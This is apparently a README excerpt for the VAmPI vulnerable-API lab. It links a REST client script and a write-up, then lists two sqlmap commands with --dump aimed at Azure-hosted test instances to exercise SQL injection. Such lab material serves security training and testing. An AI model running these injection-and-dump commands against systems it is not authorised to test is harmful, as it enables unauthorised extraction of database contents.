### Example
Install the rest client extension in VS Code (https://marketplace.visualstudio.com/items?itemName=humao.rest-client) , and use the users.http script.
More background info can be found here ; https://blog.held.codes/vampi-vulnerable-api-write-up-and-walk-through-3cce519e5e96

### SQL Injection test
Install sqlmap, and then execute the following
* sqlmap -u "https://kvaesvampiinsecure.azurewebsites.net/users/v1/*admin*" --method=GET --dump
* sqlmap -u "https://kvaestestvampi-g3dsbehwaghrgadx.b01.azurefd.net/insecure/users/v1/*admin*" --method=GET --dump
